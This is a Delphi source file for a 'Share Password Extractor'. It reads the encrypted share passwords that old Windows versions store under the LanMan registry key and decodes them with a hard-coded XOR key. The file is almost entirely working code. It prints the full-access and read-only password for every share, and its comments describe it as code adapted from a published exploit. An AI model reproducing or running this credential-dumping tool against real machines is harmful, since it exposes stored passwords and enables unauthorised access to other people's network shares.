{ spe.dpr - Extract share passwords from registry - Sigma <sigma@mail.com> 
--------------------------------------------------------------------------

Yes, so as you might know, M$ uses a XOR cypher to encrypt the share passwords
that Windoze stores in its registry. I was looking around insecure.org when
I came accross it in the exploits section, and so I decided to code this proggy.
It compiles as a 32bit console app under Delphi 3.

YES it is a frekkin HUGE mess.
YES my code is disgusting.
YES half of it is ripped from delphi's registry unit.
YES 400 lines is damn long for a program like this.

but it works. }

{$APPTYPE CONSOLE}
program spe;

uses Windows, Classes, SysUtils, Consts;

type
  ERegistryException = class(Exception);

  TRegKeyInfo = record
    NumSubKeys: Integer;
    MaxSubKeyLen: Integer;
    NumValues: Integer;
    MaxValueLen: Integer;
    MaxDataLen: Integer;
    FileTime: TFileTime;
  end;

  TRegDataType = (rdUnknown, rdString, rdExpandString, rdInteger, rdBinary);

  TRegDataInfo = record
    RegData: TRegDataType;
    DataSize: Integer;
  end;

  TRegistry = class(TObject)
  private
    FCurrentKey: HKEY;
    FRootKey: HKEY;
    FLazyWrite: Boolean;
    FCurrentPath: string;
    FCloseRootKey: Boolean;
    procedure SetRootKey(Value: HKEY);
  protected
    procedure ChangeKey(Value: HKey; const Path: string);
    function GetBaseKey(Relative: Boolean): HKey;
    function GetData(const Name: string; Buffer: Pointer;
      BufSize: Integer; var RegData: TRegDataType): Integer;
    function GetKey(const Key: string): HKEY;
    procedure SetCurrentKey(Value: HKEY);
  public
    constructor Create;
    destructor Destroy; override;
    procedure CloseKey;
    function GetDataInfo(const ValueName: string; var Value: TRegDataInfo): Boolean;
    function GetDataSize(const ValueName: string): Integer;
    function GetDataType(const ValueName: string): TRegDataType;
    function GetKeyInfo(var Value: TRegKeyInfo): Boolean;
    procedure GetKeyNames;
    function HasSubKeys: Boolean;
    function OpenKey(const Key: string; CanCreate: Boolean): Boolean;
    function ReadBinaryData(const Name: string; var Buffer; BufSize: Integer): Integer;
    function ValueExists(const Name: string): Boolean;
    property CurrentKey: HKEY read FCurrentKey;
    property CurrentPath: string read FCurrentPath;
    property LazyWrite: Boolean read FLazyWrite write FLazyWrite;
    property RootKey: HKEY read FRootKey write SetRootKey;
  end;

var thereg : TRegistry;
    sn : string;
    passwordstr1,passwordstr2,cracked1,cracked2 : string[8];
    wordlength1,wordlength2 : longint;
    password1,password2 : array[1..8] of char;
    dummy : boolean;
    const key : array[1..8] of char =  #$35#$9a#$4d#$a6#$53#$a9#$d4#$6a;  // Cool eh ?

function makepad(width : integer) : string;
var s : string;
    x : integer;
begin
     s := '';
     for x := 1 to width do
     s := s + ' ';
     makepad := s;
end;

function stringtochar(st : string) : char;
var c : char;
begin
     c := #0;
     while c <> st do
           c := succ(c);
     stringtochar := c;
end;

procedure ReadError(const Name: string);
begin
  raise ERegistryException.CreateFmt(SInvalidRegType, [Name]);
end;

function IsRelative(const Value: string): Boolean;
begin
  Result := not ((Value <> '') and (Value[1] = '\'));
end;

function RegDataToDataType(Value: TRegDataType): Integer;
begin
  case Value of
    rdString: Result := REG_SZ;
    rdExpandString: Result := REG_EXPAND_SZ;
    rdInteger: Result := REG_DWORD;
    rdBinary: Result := REG_BINARY;
  else
    Result := REG_NONE;
  end;
end;

function DataTypeToRegData(Value: Integer): TRegDataType;
begin
  if Value = REG_SZ then Result := rdString
  else if Value = REG_EXPAND_SZ then Result := rdExpandString
  else if Value = REG_DWORD then Result := rdInteger
  else if Value = REG_BINARY then Result := rdBinary
  else Result := rdUnknown;
end;

constructor TRegistry.Create;
begin
  RootKey := HKEY_CURRENT_USER;
  LazyWrite := True;
end;

destructor TRegistry.Destroy;
begin
  CloseKey;
  inherited;
end;

procedure TRegistry.CloseKey;
begin
  if CurrentKey <> 0 then
  begin
    if LazyWrite then
      RegCloseKey(CurrentKey) else
      RegFlushKey(CurrentKey);
    FCurrentKey := 0;
    FCurrentPath := '';
  end;
end;

procedure TRegistry.SetRootKey(Value: HKEY);
begin
  if RootKey <> Value then
  begin
    if FCloseRootKey then
    begin
      RegCloseKey(RootKey);
      FCloseRootKey := False;
    end;
    FRootKey := Value;
    CloseKey;
  end;
end;

procedure TRegistry.ChangeKey(Value: HKey; const Path: string);
begin
  CloseKey;
  FCurrentKey := Value;
  FCurrentPath := Path;
end;

function TRegistry.GetBaseKey(Relative: Boolean): HKey;
begin
  if (CurrentKey = 0) or not Relative then
    Result := RootKey else
    Result := CurrentKey;
end;

procedure TRegistry.SetCurrentKey(Value: HKEY);
begin
  FCurrentKey := Value;
end;

function TRegistry.OpenKey(const Key: string; CanCreate: Boolean): Boolean;
var
  TempKey: HKey;
  S: string;
  Disposition: Integer;
  Relative: Boolean;
begin
  S := Key;
  Relative := IsRelative(S);
  if not Relative then Delete(S, 1, 1);
  TempKey := 0;
  if not CanCreate or (S = '') then
  begin
    Result := RegOpenKeyEx(GetBaseKey(Relative), PChar(S), 0,
      KEY_ALL_ACCESS, TempKey) = ERROR_SUCCESS;
  end else
    Result := RegCreateKeyEx(GetBaseKey(Relative), PChar(S), 0, nil,
      REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, nil, TempKey, @Disposition) = ERROR_SUCCESS;
  if Result then
  begin
    if (CurrentKey <> 0) and Relative then S := CurrentPath + '\' + S;
    ChangeKey(TempKey, S);
  end;
end;


function TRegistry.GetKeyInfo(var Value: TRegKeyInfo): Boolean;
begin
  FillChar(Value, SizeOf(TRegKeyInfo), 0);
  Result := RegQueryInfoKey(CurrentKey, nil, nil, nil, @Value.NumSubKeys,
    @Value.MaxSubKeyLen, nil, @Value.NumValues, @Value.MaxValueLen,
    @Value.MaxDataLen, nil, @Value.FileTime) = ERROR_SUCCESS;
end;

procedure TRegistry.GetKeyNames;
var
  I,x, Len: Integer;
  Info: TRegKeyInfo;
  S: string;
begin
     sn := '';
  if GetKeyInfo(Info) then
  begin
    SetString(S, nil, Info.MaxSubKeyLen + 1);
    for I := 0 to Info.NumSubKeys - 1 do

    begin
      Len := Info.MaxSubKeyLen + 1;
       RegEnumKeyEx(CurrentKey, I, PChar(S), Len, nil, nil, nil, nil);
     begin
                         if OpenKey(s, false) = true then
                         begin
                              for x := 1 to 8 do
                              begin
                                   password1[x] := #0;
                                   password2[x] := #0;
                              end;

                              readbinarydata('Parm2enc',password2,8);
                              readbinarydata('Parm1enc',password1,8);

                              dummy := OpenKey('\SOFTWARE\Microsoft\Windows\CurrentVersion\Network\LanMan', false);
                              sn := copy(s,1,pos(#0,s)-1);
                              sn := sn + makepad(18 - length(sn));
                              write(' ',sn);

                              x := 1;
                              passwordstr1 := '';
                              passwordstr2 := '';
                              cracked1 := '';
                              cracked2 := '';

                              while password1[x] <> #0 do
                              begin
                                   passwordstr1 := passwordstr1 + password1[x];
                                   inc(x);
                              end;
                              wordlength1 := length(passwordstr1);
                              x:=1;

                              while password2[x] <> #0 do
                              begin
                                   passwordstr2 := passwordstr2 + password2[x];
                                   inc(x);
                              end;
                              wordlength2 := length(passwordstr2);

                              for x := 1 to wordlength1 do
                              begin
                                   if password1[x] <> #0 then
                                   cracked1 := cracked1 + chr(ord(stringtochar(copy(passwordstr1,x,1))) XOR ord(key[x]));
                              end;

                              for x := 1 to wordlength2 do
                              begin
                                   if password2[x] <> #0 then
                                   cracked2 := cracked2 + chr(ord(stringtochar(copy(passwordstr2,x,1))) XOR ord(key[x]));
                              end;

                              if cracked1 <> '' then
                              write(cracked1,makepad(21 - length(cracked1)))
                              else write('-                    ');

                              if cracked2 <> '' then
                              write(cracked2)
                              else write('-');
                              writeln;


                         end;
                    end;
    end;
  end;
end;

function TRegistry.GetDataInfo(const ValueName: string; var Value: TRegDataInfo): Boolean;
var
  DataType: Integer;
begin
  FillChar(Value, SizeOf(TRegDataInfo), 0);
  Result := RegQueryValueEx(CurrentKey, PChar(ValueName), nil, @DataType, nil,
    @Value.DataSize) = ERROR_SUCCESS;
  Value.RegData := DataTypeToRegData(DataType);
end;

function TRegistry.GetDataSize(const ValueName: string): Integer;
var
  Info: TRegDataInfo;
begin
  if GetDataInfo(ValueName, Info) then
    Result := Info.DataSize else
    Result := -1;
end;

function TRegistry.GetDataType(const ValueName: string): TRegDataType;
var
  Info: TRegDataInfo;
begin
  if GetDataInfo(ValueName, Info) then
    Result := Info.RegData else
    Result := rdUnknown;
end;

function TRegistry.ReadBinaryData(const Name: string; var Buffer; BufSize: Integer): Integer;
var
  RegData: TRegDataType;
  Info: TRegDataInfo;
begin
  if GetDataInfo(Name, Info) then
  begin
    Result := Info.DataSize;
    RegData := Info.RegData;
    if (RegData = rdBinary) and (Result <= BufSize) then
      GetData(Name, @Buffer, Result, RegData)
    else ReadError(Name);
  end else
    Result := 0;
end;

function TRegistry.GetData(const Name: string; Buffer: Pointer;
  BufSize: Integer; var RegData: TRegDataType): Integer;
var
  DataType: Integer;
begin
  DataType := REG_NONE;
  if RegQueryValueEx(CurrentKey, PChar(Name), nil, @DataType, PByte(Buffer),
    @BufSize) <> ERROR_SUCCESS then
    raise ERegistryException.CreateFmt(SRegGetDataFailed, [Name]);
  Result := BufSize;
  RegData := DataTypeToRegData(DataType);
end;

function TRegistry.HasSubKeys: Boolean;
var
  Info: TRegKeyInfo;
begin
  Result := GetKeyInfo(Info) and (Info.NumSubKeys > 0);
end;

function TRegistry.ValueExists(const Name: string): Boolean;
var
  Info: TRegDataInfo;
begin
  Result := GetDataInfo(Name, Info);
end;

function TRegistry.GetKey(const Key: string): HKEY;
var
  S: string;
  Relative: Boolean;
begin
  S := Key;
  Relative := IsRelative(S);
  if not Relative then Delete(S, 1, 1);
  Result := 0;
  RegOpenKeyEx(GetBaseKey(Relative), PChar(S), 0,
    KEY_ALL_ACCESS, Result);
end;

begin
     writeln;
     writeln(' +-----------------------------------------------+');
     writeln(' | SHARE PASSWORD EXTRACTOR  v1.0                |');
     writeln(' | By: Sigma <sigma@mail.com>                    |');
     writeln(' | Based on BUGTRAQ post by: a42n8k9@redrose.net |');
     writeln(' +-----------------------------------------------+');
     writeln;
     writeln(' Share name        Full password        Read only password');
     writeln(' ---------------------------------------------------------');

     thereg := TRegistry.Create;
     with theReg do
     begin
          RootKey := HKEY_LOCAL_MACHINE;
          if OpenKey('\SOFTWARE\Microsoft\Windows\CurrentVersion\Network\LanMan', false) = true then
          begin
               if hassubkeys then
               begin
                    GetKeyNames;
              end;
          end;
     end;
end.
